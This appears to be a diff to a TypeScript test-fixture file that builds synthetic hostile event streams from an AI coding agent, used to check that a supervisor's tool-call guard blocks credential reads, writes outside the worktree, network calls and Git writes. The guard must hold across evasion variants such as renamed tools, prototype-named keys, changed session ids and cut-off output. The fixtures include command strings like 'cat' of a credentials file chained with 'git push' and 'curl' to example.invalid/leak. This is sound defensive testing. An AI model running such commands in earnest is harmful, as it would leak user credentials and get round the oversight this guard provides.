@@ -10,19 +10,29 @@
  * entries) and `AGENTS.md` load (live check rows 10a, 10c); what this case proves is that no flag widens that.
  *
  * Tool-call guard (T4.56, ADR-0039): in an approved bypass run Switchboard's own tool-call guard enforces Git-write
- * denial across the hostile streams, ending `PERMISSION_BLOCKED` at exit 0 and at exit 1 (owner decision 25), including
- * a `completed` tool call inside a multi-step run (row 5) and a hostile tool call after the final `stop` step in every
- * hostile category (Q-85), each at exit 0 and exit 1 across the categories, a run that never reaches a `stop` step, and
- * a hostile call followed by a provider `error` line (row 14b quota, plus `provider.no-route`, `provider.auth` and an
- * unmapped type), all at exit 0 and exit 1 in every hostile category; also several Git-write forms (`git branch -D`
- * included), `pending` and `running` tool states, a session id that changes mid-run (including a change carried only
- * on `part.sessionID`), unknown event kinds before the hostile call, a second `stop` step, and `backing_provider` /
- * `model` fields (T4.6) that must not wash the guard verdict. An own `__proto__` key beside a string `command` does
- * not replace that command. A shell tool named `bash`, or any other name whose input carries a string `command`,
- * reaches the guard (fail closed in the adapter). An unknown event kind before a final `stop` step is not a success;
- * those streams are not in this list, because an `unknown_events` stream must parse only as `unknown`, and they are
- * exported below for their own replay. Partial streams are exported separately below.
- * Bare or unreadable known events before or after `stop` are replayed separately below: they cannot become success.
+ * denial across the hostile streams, ending `PERMISSION_BLOCKED` at exit 0 and at exit 1 (owner decision 25). The matrix
+ * covers all three blocked categories (`credential_read`, `out_of_worktree_write`, `network`) across exits 0 and 1:
+ * - multi-step runs (row 5) and runs with no final `stop` step;
+ * - hostile tool calls after the final `stop` step (Q-85) and within intermediate steps following `stop`;
+ * - hostile calls followed by provider errors (`provider.quota`, `provider.no-route`, `provider.auth`,
+ *   `provider.rate_limit`, `provider.overloaded`, and unmapped/string error payloads), where the guard verdict outranks
+ *   the provider error;
+ * - tool states `pending` and `running`;
+ * - Git-write syntax forms recognized by `gitWriteInCommand` and Q-64 (`git commit -am`, `git -C . push --force`,
+ *   `git update-ref`, `git branch -D`, `git -C . commit`, `/usr/bin/git commit`, `sh -c 'git push ...'`, `env git push`,
+ *   `xargs git push`, `git --git-dir=.git commit`, `git reset --hard`, `git tag`, `git stash`, `git merge`, `git rebase`,
+ *   `git checkout -b`);
+ * - alternative tool names carrying a command (`bash`, `sh`, `terminal`, `run_command`, `exec`, `synthetic_exec`,
+ *   `constructor`, `toString`);
+ * - session ID mutations (changed on root, on part, or both) and fronted backing provider/model combinations (T4.6);
+ * - own prototype-named keys (`__proto__`, `constructor`) on input and part;
+ * - benign commands (shell, edit, read) preceding hostile calls, multiple stop steps, and unknown events before hostile calls.
+ *
+ * Streams in `unknown_events` parse only as `unknown` and end `OUTPUT_PROTOCOL_ERROR` (exit 0) or `TOOL_FAILURE` (exit 1).
+ * Partial streams cut inside a line across all three blocked categories at exit 0 and exit 1 are exported as
+ * `opencodePartialStreams`. Bare and unreadable known events before and after `stop` at exit 0 and exit 1 are exported as
+ * `opencodeUnreadableStreams`.
+ *
  * A Git write that is not an own string `command` on a shell-kind tool (a known file tool, a `cmd` alias, or a command
  * only under an own `__proto__` key) is not in the blocked list: the parser does not pass it to the guard (T4.53
  * Assumptions). Closing that needs a scrubbed capture of native input keys, not another synthetic `command` shape.
@@ -192,6 +202,7 @@ const opencodeBlockedGaps = (fx: MaliciousFixture): HostileStream[] => {
     ["credential_read", "provider.no-route", "SYNTHETIC: no route"],
     ["out_of_worktree_write", "provider.auth", "SYNTHETIC: auth error"],
     ["network", "provider.rate_limit", "SYNTHETIC: unmapped rate-limit type"],
+    ["credential_read", "provider.overloaded", "SYNTHETIC: overloaded"],
   ];
   for (const [category, errorType, message] of errors) {
     for (const exitCode of [0, 1] as const) {
@@ -207,13 +218,96 @@ const opencodeBlockedGaps = (fx: MaliciousFixture): HostileStream[] => {
     }
   }
   gaps.push(
-    blocked("shell write outside the worktree chained with git branch -D", "out_of_worktree_write", 0, [
+    blocked("shell write outside the worktree, then a raw string error", "out_of_worktree_write", 0, [
       STEP_START,
-      completed("shell", {
-        command: hostileCommand(fx, "out_of_worktree_write", "git branch -D synthetic"),
+      completed("shell", { command: hostileCommand(fx, "out_of_worktree_write") }),
+      JSON.stringify({
+        type: "error",
+        timestamp: 1_760_000_000_000,
+        sessionID: SID,
+        error: "SYNTHETIC: raw unformatted error",
       }),
       STOP,
     ]),
+    blocked("shell network call, then a raw string error, exit 1", "network", 1, [
+      STEP_START,
+      completed("shell", { command: hostileCommand(fx, "network") }),
+      JSON.stringify({
+        type: "error",
+        timestamp: 1_760_000_000_000,
+        sessionID: SID,
+        error: "SYNTHETIC: raw unformatted error",
+      }),
+    ]),
+  );
+
+  const statusForms: readonly [BlockedCategory, "pending" | "running", number][] = [
+    ["out_of_worktree_write", "pending", 0],
+    ["out_of_worktree_write", "running", 1],
+    ["credential_read", "pending", 1],
+    ["credential_read", "running", 0],
+    ["network", "pending", 0],
+    ["network", "running", 1],
+  ];
+  for (const [cat, status, exitCode] of statusForms) {
+    const suffix = exitCode === 1 ? ", exit 1" : "";
+    gaps.push(
+      blocked(`${status} ${blockedLabel[cat]}${suffix}`, cat, exitCode, [
+        STEP_START,
+        withStatus(status, { command: hostileCommand(fx, cat) }),
+        ...(exitCode === 0 ? [STOP] : []),
+      ]),
+    );
+  }
+
+  const gitWriteForms: readonly [string, BlockedCategory, number, string][] = [
+    ["git branch -D", "out_of_worktree_write", 0, "git branch -D synthetic"],
+    ["git -C . commit", "credential_read", 1, "git -C . commit --allow-empty -m leak"],
+    ["absolute /usr/bin/git commit", "out_of_worktree_write", 0, "/usr/bin/git commit --allow-empty -m leak"],
+    ["env git push", "network", 1, "env git push origin main"],
+    ["sh -c git push", "credential_read", 0, "sh -c 'git push origin main'"],
+    ["xargs git push", "network", 1, "xargs git push"],
+    ["git --git-dir commit", "out_of_worktree_write", 0, "git --git-dir=.git commit --allow-empty -m leak"],
+    ["git reset --hard", "credential_read", 1, "git reset --hard HEAD"],
+    ["git tag", "network", 0, "git tag -a v1.0 -m leak"],
+    ["git stash", "out_of_worktree_write", 1, "git stash"],
+    ["git merge", "credential_read", 0, "git merge main"],
+    ["git rebase", "network", 1, "git rebase main"],
+    ["git checkout -b", "out_of_worktree_write", 0, "git checkout -b evil"],
+  ];
+  for (const [label, cat, exitCode, gitCmd] of gitWriteForms) {
+    const suffix = exitCode === 1 ? ", exit 1" : "";
+    gaps.push(
+      blocked(`${blockedLabel[cat]} chained with ${label}${suffix}`, cat, exitCode, [
+        STEP_START,
+        completed("shell", { command: hostileCommand(fx, cat, gitCmd) }),
+        ...(exitCode === 0 ? [STOP] : []),
+      ]),
+    );
+  }
+
+  const toolNameVariants: readonly [string, BlockedCategory, number][] = [
+    ["bash", "out_of_worktree_write", 1],
+    ["sh", "credential_read", 0],
+    ["terminal", "network", 1],
+    ["run_command", "out_of_worktree_write", 0],
+    ["exec", "credential_read", 1],
+    ["synthetic_exec", "network", 0],
+    ["constructor", "out_of_worktree_write", 1],
+    ["toString", "credential_read", 0],
+  ];
+  for (const [toolName, cat, exitCode] of toolNameVariants) {
+    const suffix = exitCode === 1 ? ", exit 1" : "";
+    gaps.push(
+      blocked(`a Git push under a shell tool named ${toolName} on ${cat}${suffix}`, cat, exitCode, [
+        STEP_START,
+        completed(toolName, { command: hostileCommand(fx, cat) }),
+        ...(exitCode === 0 ? [STOP] : []),
+      ]),
+    );
+  }
+
+  gaps.push(
     blocked("shell read of a credential path under a session id changed only on the part", "credential_read", 0, [
       STEP_START,
       toolUse(hostileCommand(fx, "credential_read"), (root, part) => {
@@ -222,7 +316,33 @@ const opencodeBlockedGaps = (fx: MaliciousFixture): HostileStream[] => {
       }),
       STOP,
     ]),
-    // The backing fields are read only when the session is first bound, so this line is the first event.
+    blocked(
+      "shell read of a credential path under a session id changed only on the part, exit 1",
+      "credential_read",
+      1,
+      [
+        STEP_START,
+        toolUse(hostileCommand(fx, "credential_read"), (root, part) => {
+          delete root.sessionID;
+          part.sessionID = OTHER_SID;
+        }),
+      ],
+    ),
+    blocked("shell write outside the worktree under a changed session id, exit 1", "out_of_worktree_write", 1, [
+      STEP_START,
+      toolUse(hostileCommand(fx, "out_of_worktree_write"), (root, part) => {
+        root.sessionID = OTHER_SID;
+        part.sessionID = OTHER_SID;
+      }),
+    ]),
+    blocked("shell network call under a session id changed on both root and part", "network", 0, [
+      STEP_START,
+      toolUse(hostileCommand(fx, "network"), (root, part) => {
+        root.sessionID = OTHER_SID;
+        part.sessionID = OTHER_SID;
+      }),
+      STOP,
+    ]),
     blocked(
       "shell write outside the worktree with a backing provider and model on the event",
       "out_of_worktree_write",
@@ -241,11 +361,24 @@ const opencodeBlockedGaps = (fx: MaliciousFixture): HostileStream[] => {
         part.model = "synthetic-other-model";
       }),
     ]),
+    blocked("shell read of a credential path with root backingProvider and model", "credential_read", 0, [
+      toolUse(hostileCommand(fx, "credential_read"), (root) => {
+        root.backingProvider = "anthropic";
+        root.model = "synthetic-claude-model";
+      }),
+      STOP,
+    ]),
+    blocked("shell write outside the worktree with root backingProvider and part model", "out_of_worktree_write", 0, [
+      toolUse(hostileCommand(fx, "out_of_worktree_write"), (root, part) => {
+        root.backingProvider = "anthropic";
+        part.model = "synthetic-claude-model";
+      }),
+      STOP,
+    ]),
     blocked("shell read of a credential path whose input also has an own __proto__ command", "credential_read", 0, [
       STEP_START,
       toolUse(hostileCommand(fx, "credential_read"), (_root, part) => {
         const state = part.state as { input: Record<string, unknown> };
-        // Own key, not the prototype setter: JSON.parse keeps it own, and the parser reads `command` with hasOwn.
         Object.defineProperty(state.input, "__proto__", {
           value: { command: "echo synthetic-safe" },
           enumerable: true,
@@ -253,10 +386,104 @@ const opencodeBlockedGaps = (fx: MaliciousFixture): HostileStream[] => {
       }),
       STOP,
     ]),
+    blocked(
+      "shell read of a credential path whose input also has an own __proto__ command, exit 1",
+      "credential_read",
+      1,
+      [
+        STEP_START,
+        toolUse(hostileCommand(fx, "credential_read"), (_root, part) => {
+          const state = part.state as { input: Record<string, unknown> };
+          Object.defineProperty(state.input, "__proto__", {
+            value: { command: "echo synthetic-safe" },
+            enumerable: true,
+          });
+        }),
+      ],
+    ),
+    blocked(
+      "shell write outside the worktree whose input also has an own constructor command",
+      "out_of_worktree_write",
+      0,
+      [
+        STEP_START,
+        toolUse(hostileCommand(fx, "out_of_worktree_write"), (_root, part) => {
+          const state = part.state as { input: Record<string, unknown> };
+          Object.defineProperty(state.input, "constructor", {
+            value: "echo synthetic-safe",
+            enumerable: true,
+          });
+        }),
+        STOP,
+      ],
+    ),
+    blocked(
+      "shell write outside the worktree whose input also has an own constructor command, exit 1",
+      "out_of_worktree_write",
+      1,
+      [
+        STEP_START,
+        toolUse(hostileCommand(fx, "out_of_worktree_write"), (_root, part) => {
+          const state = part.state as { input: Record<string, unknown> };
+          Object.defineProperty(state.input, "constructor", {
+            value: "echo synthetic-safe",
+            enumerable: true,
+          });
+        }),
+      ],
+    ),
+    blocked("shell network call whose part also has an own __proto__ tool", "network", 0, [
+      STEP_START,
+      toolUse(hostileCommand(fx, "network"), (_root, part) => {
+        Object.defineProperty(part, "__proto__", {
+          value: { tool: "benign" },
+          enumerable: true,
+        });
+      }),
+      STOP,
+    ]),
+    blocked("shell network call whose part also has an own __proto__ tool, exit 1", "network", 1, [
+      STEP_START,
+      toolUse(hostileCommand(fx, "network"), (_root, part) => {
+        Object.defineProperty(part, "__proto__", {
+          value: { tool: "benign" },
+          enumerable: true,
+        });
+      }),
+    ]),
     blocked("shell network call, then two stop steps", "network", 0, [
       STEP_START,
       completed("shell", { command: hostileCommand(fx, "network") }),
       STOP,
+      STOP,
+    ]),
+    blocked("shell network call, then two stop steps, exit 1", "network", 1, [
+      STEP_START,
+      completed("shell", { command: hostileCommand(fx, "network") }),
+      STOP,
+      STOP,
+    ]),
+    blocked("benign shell command, then shell write outside the worktree", "out_of_worktree_write", 0, [
+      STEP_START,
+      completed("shell", { command: "echo safe" }),
+      TOOL_STEP,
+      STEP_START,
+      completed("shell", { command: hostileCommand(fx, "out_of_worktree_write") }),
+      STOP,
+    ]),
+    blocked("benign file edit, then shell read of a credential path, exit 1", "credential_read", 1, [
+      STEP_START,
+      completed("edit", { filePath: "src/safe.ts" }),
+      TOOL_STEP,
+      STEP_START,
+      completed("shell", { command: hostileCommand(fx, "credential_read") }),
+    ]),
+    blocked("benign file read, then shell network call", "network", 0, [
+      STEP_START,
+      completed("read", { filePath: "src/safe.ts" }),
+      TOOL_STEP,
+      STEP_START,
+      completed("shell", { command: hostileCommand(fx, "network") }),
       STOP,
     ]),
     blocked("unknown event kinds, then a shell write outside the worktree, exit 1", "out_of_worktree_write", 1, [
@@ -265,14 +492,45 @@ const opencodeBlockedGaps = (fx: MaliciousFixture): HostileStream[] => {
       completed("shell", { command: hostileCommand(fx, "out_of_worktree_write") }),
       STOP,
     ]),
-    blocked("pending shell write outside the worktree", "out_of_worktree_write", 0, [
+    blocked("unknown event kinds, then shell read of a credential path", "credential_read", 0, [
       STEP_START,
-      withStatus("pending", { command: hostileCommand(fx, "out_of_worktree_write") }),
+      JSON.stringify({ type: "synthetic_unknown_kind", sessionID: SID }),
+      completed("shell", { command: hostileCommand(fx, "credential_read") }),
       STOP,
     ]),
-    blocked("running shell write outside the worktree, exit 1", "out_of_worktree_write", 1, [
+    blocked(
+      "shell read of a credential path inside intermediate step after the final stop step, exit 1",
+      "credential_read",
+      1,
+      [
+        STEP_START,
+        event("text", { type: "text", text: "Done." }),
+        STOP,
+        STEP_START,
+        completed("shell", { command: hostileCommand(fx, "credential_read") }),
+        TOOL_STEP,
+      ],
+    ),
+    blocked(
+      "shell write outside the worktree inside intermediate step after the final stop step",
+      "out_of_worktree_write",
+      0,
+      [
+        STEP_START,
+        event("text", { type: "text", text: "Done." }),
+        STOP,
+        STEP_START,
+        completed("shell", { command: hostileCommand(fx, "out_of_worktree_write") }),
+        TOOL_STEP,
+      ],
+    ),
+    blocked("shell network call inside intermediate step after the final stop step, exit 1", "network", 1, [
       STEP_START,
-      withStatus("running", { command: hostileCommand(fx, "out_of_worktree_write") }),
+      event("text", { type: "text", text: "Done." }),
+      STOP,
+      STEP_START,
+      completed("shell", { command: hostileCommand(fx, "network") }),
+      TOOL_STEP,
     ]),
     {
       name: "only prototype-named, near-miss and non-string event types, exit 1",
@@ -286,6 +544,52 @@ const opencodeBlockedGaps = (fx: MaliciousFixture): HostileStream[] => {
         JSON.stringify({ type: "step-finish", part: { reason: "stop" } }),
         JSON.stringify({ type: 1, part: { reason: "stop" } }),
         JSON.stringify({ type: "tool_use_update" }),
+      ],
+    },
+    {
+      name: "bare tool_use, non-string fields and prototype-key commands, clean exit",
+      category: "unknown_events",
+      exitCode: 0,
+      failureCode: "OUTPUT_PROTOCOL_ERROR",
+      lines: [
+        META("Bare and unreadable tool lines; the adapter must report them unknown.", 0),
+        JSON.stringify({ type: "tool_use" }),
+        JSON.stringify({ type: "tool_use", part: {} }),
+        JSON.stringify({ type: "tool_use", part: { tool: 7 } }),
+        JSON.stringify({ type: "step_start" }),
+        JSON.stringify({ type: "step_finish" }),
+        JSON.stringify({ type: "step_finish", part: {} }),
+        JSON.stringify({ type: "error" }),
+        JSON.stringify({ type: "error", error: null }),
+        JSON.stringify({ type: "text" }),
+        JSON.stringify({ type: "text", part: {} }),
+        `{"type":"tool_use","__proto__":{"part":{"tool":"shell"}}}`,
+        "null",
+        "123",
+        "{}",
+      ],
+    },
+    {
+      name: "bare tool_use, non-string fields and prototype-key commands, exit 1",
+      category: "unknown_events",
+      exitCode: 1,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Bare and unreadable tool lines; the adapter must report them unknown.", 1),
+        JSON.stringify({ type: "tool_use" }),
+        JSON.stringify({ type: "tool_use", part: {} }),
+        JSON.stringify({ type: "tool_use", part: { tool: 7 } }),
+        JSON.stringify({ type: "step_start" }),
+        JSON.stringify({ type: "step_finish" }),
+        JSON.stringify({ type: "step_finish", part: {} }),
+        JSON.stringify({ type: "error" }),
+        JSON.stringify({ type: "error", error: null }),
+        JSON.stringify({ type: "text" }),
+        JSON.stringify({ type: "text", part: {} }),
+        `{"type":"tool_use","__proto__":{"part":{"tool":"shell"}}}`,
+        "null",
+        "123",
+        "{}",
       ],
     },
   );
@@ -809,6 +1113,55 @@ export default opencodeCase;
  * so `test/malicious/adapter-leg.test.ts` replays them on their own: never success, hostile checkout untouched.
  */
 export const opencodePartialStreams = (fx: MaliciousFixture): HostileStream[] => [
+  // 1. Credential read: cut before, cut inside, cut inside stop, cut inside next tool_use
+  {
+    name: "output cut before credential read, then a stop step",
+    category: "credential_read",
+    exitCode: 0,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("output cut before credential read, then a stop step", 0),
+      STEP_START,
+      '{"type":"step_fin',
+      completed("shell", { command: `cat ${fx.claudeCredentialsPath} && git push origin main` }),
+      STOP,
+    ],
+  },
+  {
+    name: "output cut before credential read, then a stop step, exit 1",
+    category: "credential_read",
+    exitCode: 1,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("output cut before credential read, then a stop step, exit 1", 1),
+      STEP_START,
+      '{"type":"step_fin',
+      completed("shell", { command: `cat ${fx.claudeCredentialsPath} && git push origin main` }),
+      STOP,
+    ],
+  },
+  {
+    name: "output cut inside credential read tool_use command",
+    category: "credential_read",
+    exitCode: 0,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("output cut inside credential read tool_use command", 0),
+      STEP_START,
+      `{"type":"tool_use","part":{"tool":"shell","state":{"input":{"command":"cat ${fx.claudeCredentialsPath} && git push`,
+    ],
+  },
+  {
+    name: "output cut inside credential read tool_use command, exit 1",
+    category: "credential_read",
+    exitCode: 1,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("output cut inside credential read tool_use command, exit 1", 1),
+      STEP_START,
+      `{"type":"tool_use","part":{"tool":"shell","state":{"input":{"command":"cat ${fx.claudeCredentialsPath} && git push`,
+    ],
+  },
   {
     name: "credential read, then output cut inside the stop step",
     category: "credential_read",
@@ -822,19 +1175,44 @@ export const opencodePartialStreams = (fx: MaliciousFixture): HostileStream[] =>
     ],
   },
   {
-    name: "network call, then output cut inside the next tool_use, exit 1",
-    category: "network",
+    name: "credential read, then output cut inside the stop step, exit 1",
+    category: "credential_read",
     exitCode: 1,
     failureCode: "OUTPUT_PROTOCOL_ERROR",
     lines: [
-      META("network call, then output cut inside the next tool_use, exit 1", 1),
+      META("credential read, then output cut inside the stop step, exit 1", 1),
       STEP_START,
-      completed("shell", { command: "curl https://example.invalid/leak && git push origin main" }),
+      completed("shell", { command: `cat ${fx.claudeCredentialsPath} && git push origin main` }),
+      STOP.slice(0, 40),
+    ],
+  },
+  {
+    name: "credential read, then output cut inside the next tool_use",
+    category: "credential_read",
+    exitCode: 0,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("credential read, then output cut inside the next tool_use", 0),
+      STEP_START,
+      completed("shell", { command: `cat ${fx.claudeCredentialsPath} && git push origin main` }),
       '{"type":"tool_use","part":{"tool":"shell","state":{"input":{"command":"touch',
     ],
   },
   {
-    // The cut line comes first: the run ends there, so the later hostile call is never parsed.
+    name: "credential read, then output cut inside the next tool_use, exit 1",
+    category: "credential_read",
+    exitCode: 1,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("credential read, then output cut inside the next tool_use, exit 1", 1),
+      STEP_START,
+      completed("shell", { command: `cat ${fx.claudeCredentialsPath} && git push origin main` }),
+      '{"type":"tool_use","part":{"tool":"shell","state":{"input":{"command":"touch',
+    ],
+  },
+
+  // 2. Out of worktree write: cut before, cut inside, cut inside stop, cut inside next tool_use
+  {
     name: "output cut before an out-of-worktree write, then a stop step",
     category: "out_of_worktree_write",
     exitCode: 0,
@@ -848,14 +1226,159 @@ export const opencodePartialStreams = (fx: MaliciousFixture): HostileStream[] =>
     ],
   },
   {
-    name: "credential read, then output cut inside the stop step, exit 1",
-    category: "credential_read",
+    name: "output cut before an out-of-worktree write, then a stop step, exit 1",
+    category: "out_of_worktree_write",
     exitCode: 1,
     failureCode: "OUTPUT_PROTOCOL_ERROR",
     lines: [
-      META("credential read, then output cut inside the stop step, exit 1", 1),
+      META("output cut before an out-of-worktree write, then a stop step, exit 1", 1),
       STEP_START,
-      completed("shell", { command: `cat ${fx.claudeCredentialsPath} && git push origin main` }),
+      '{"type":"step_fin',
+      completed("shell", { command: `touch ${fx.outsideSentinel} && git push origin main` }),
+      STOP,
+    ],
+  },
+  {
+    name: "output cut inside out-of-worktree write tool_use command",
+    category: "out_of_worktree_write",
+    exitCode: 0,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("output cut inside out-of-worktree write tool_use command", 0),
+      STEP_START,
+      `{"type":"tool_use","part":{"tool":"shell","state":{"input":{"command":"touch ${fx.outsideSentinel} && git push`,
+    ],
+  },
+  {
+    name: "output cut inside out-of-worktree write tool_use command, exit 1",
+    category: "out_of_worktree_write",
+    exitCode: 1,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("output cut inside out-of-worktree write tool_use command, exit 1", 1),
+      STEP_START,
+      `{"type":"tool_use","part":{"tool":"shell","state":{"input":{"command":"touch ${fx.outsideSentinel} && git push`,
+    ],
+  },
+  {
+    name: "out-of-worktree write, then output cut inside the stop step",
+    category: "out_of_worktree_write",
+    exitCode: 0,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("out-of-worktree write, then output cut inside the stop step", 0),
+      STEP_START,
+      completed("shell", { command: `touch ${fx.outsideSentinel} && git push origin main` }),
+      STOP.slice(0, 40),
+    ],
+  },
+  {
+    name: "out-of-worktree write, then output cut inside the stop step, exit 1",
+    category: "out_of_worktree_write",
+    exitCode: 1,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("out-of-worktree write, then output cut inside the stop step, exit 1", 1),
+      STEP_START,
+      completed("shell", { command: `touch ${fx.outsideSentinel} && git push origin main` }),
+      STOP.slice(0, 40),
+    ],
+  },
+  {
+    name: "out-of-worktree write, then output cut inside the next tool_use",
+    category: "out_of_worktree_write",
+    exitCode: 0,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("out-of-worktree write, then output cut inside the next tool_use", 0),
+      STEP_START,
+      completed("shell", { command: `touch ${fx.outsideSentinel} && git push origin main` }),
+      '{"type":"tool_use","part":{"tool":"shell","state":{"input":{"command":"touch',
+    ],
+  },
+  {
+    name: "out-of-worktree write, then output cut inside the next tool_use, exit 1",
+    category: "out_of_worktree_write",
+    exitCode: 1,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("out-of-worktree write, then output cut inside the next tool_use, exit 1", 1),
+      STEP_START,
+      completed("shell", { command: `touch ${fx.outsideSentinel} && git push origin main` }),
+      '{"type":"tool_use","part":{"tool":"shell","state":{"input":{"command":"touch',
+    ],
+  },
+
+  // 3. Network call: cut before, cut inside, cut inside stop, cut inside next tool_use
+  {
+    name: "output cut before a network call, then a stop step",
+    category: "network",
+    exitCode: 0,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("output cut before a network call, then a stop step", 0),
+      STEP_START,
+      '{"type":"step_fin',
+      completed("shell", { command: "curl https://example.invalid/leak && git push origin main" }),
+      STOP,
+    ],
+  },
+  {
+    name: "output cut before a network call, then a stop step, exit 1",
+    category: "network",
+    exitCode: 1,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("output cut before a network call, then a stop step, exit 1", 1),
+      STEP_START,
+      '{"type":"step_fin',
+      completed("shell", { command: "curl https://example.invalid/leak && git push origin main" }),
+      STOP,
+    ],
+  },
+  {
+    name: "output cut inside network tool_use command",
+    category: "network",
+    exitCode: 0,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("output cut inside network tool_use command", 0),
+      STEP_START,
+      '{"type":"tool_use","part":{"tool":"shell","state":{"input":{"command":"curl https://example.invalid/leak && git push',
+    ],
+  },
+  {
+    name: "output cut inside network tool_use command, exit 1",
+    category: "network",
+    exitCode: 1,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("output cut inside network tool_use command, exit 1", 1),
+      STEP_START,
+      '{"type":"tool_use","part":{"tool":"shell","state":{"input":{"command":"curl https://example.invalid/leak && git push',
+    ],
+  },
+  {
+    name: "network call, then output cut inside the stop step",
+    category: "network",
+    exitCode: 0,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("network call, then output cut inside the stop step", 0),
+      STEP_START,
+      completed("shell", { command: "curl https://example.invalid/leak && git push origin main" }),
+      STOP.slice(0, 40),
+    ],
+  },
+  {
+    name: "network call, then output cut inside the stop step, exit 1",
+    category: "network",
+    exitCode: 1,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("network call, then output cut inside the stop step, exit 1", 1),
+      STEP_START,
+      completed("shell", { command: "curl https://example.invalid/leak && git push origin main" }),
       STOP.slice(0, 40),
     ],
   },
@@ -872,16 +1395,15 @@ export const opencodePartialStreams = (fx: MaliciousFixture): HostileStream[] =>
     ],
   },
   {
-    name: "output cut before an out-of-worktree write, then a stop step, exit 1",
-    category: "out_of_worktree_write",
+    name: "network call, then output cut inside the next tool_use, exit 1",
+    category: "network",
     exitCode: 1,
     failureCode: "OUTPUT_PROTOCOL_ERROR",
     lines: [
-      META("output cut before an out-of-worktree write, then a stop step, exit 1", 1),
+      META("network call, then output cut inside the next tool_use, exit 1", 1),
       STEP_START,
-      '{"type":"step_fin',
-      completed("shell", { command: `touch ${fx.outsideSentinel} && git push origin main` }),
-      STOP,
+      completed("shell", { command: "curl https://example.invalid/leak && git push origin main" }),
+      '{"type":"tool_use","part":{"tool":"shell","state":{"input":{"command":"touch',
     ],
   },
 ];
@@ -918,6 +1440,30 @@ export const opencodeUnreadableStreams = (): HostileStream[] => [
       STOP,
     ],
   },
+  {
+    name: "an unknown event kind after the final stop step",
+    category: "unknown_events",
+    exitCode: 0,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("an unknown event kind after the final stop step", 0),
+      STEP_START,
+      STOP,
+      JSON.stringify({ type: "synthetic_unknown_kind", sessionID: SID }),
+    ],
+  },
+  {
+    name: "an unknown event kind after the final stop step, exit 1",
+    category: "unknown_events",
+    exitCode: 1,
+    failureCode: "TOOL_FAILURE",
+    lines: [
+      META("an unknown event kind after the final stop step, exit 1", 1),
+      STEP_START,
+      STOP,
+      JSON.stringify({ type: "synthetic_unknown_kind", sessionID: SID }),
+    ],
+  },
   // Valid JSON in deliberately unreadable, SYNTHETIC shapes. These exercise the adapter's unknown-event path,
   // unlike partial JSON above (which the supervisor rejects before parseEvent). No native denial is implied.
   ...[
@@ -933,6 +1479,14 @@ export const opencodeUnreadableStreams = (): HostileStream[] => [
     { name: "step_start without a part", line: JSON.stringify({ type: "step_start", sessionID: SID }) },
     { name: "step_start with a foreign part type", line: event("step_start", { type: "step-finish" }) },
     { name: "error without an error payload", line: JSON.stringify({ type: "error", sessionID: SID }) },
+    { name: "bare empty object", line: "{}" },
+    { name: "bare null value", line: "null" },
+    { name: "bare number value", line: "123" },
+    { name: "event with non-string type", line: JSON.stringify({ type: 42, sessionID: SID }) },
+    { name: "event with prototype-named type", line: JSON.stringify({ type: "__proto__", sessionID: SID }) },
+    { name: "error with null error payload", line: JSON.stringify({ type: "error", sessionID: SID, error: null }) },
+    { name: "step_finish without part", line: JSON.stringify({ type: "step_finish", sessionID: SID }) },
+    { name: "tool_use without part", line: JSON.stringify({ type: "tool_use", sessionID: SID }) },
   ].flatMap(({ name, line }) =>
     [false, true].flatMap((afterStop) =>
       [0, 1].map((exitCode): HostileStream => {
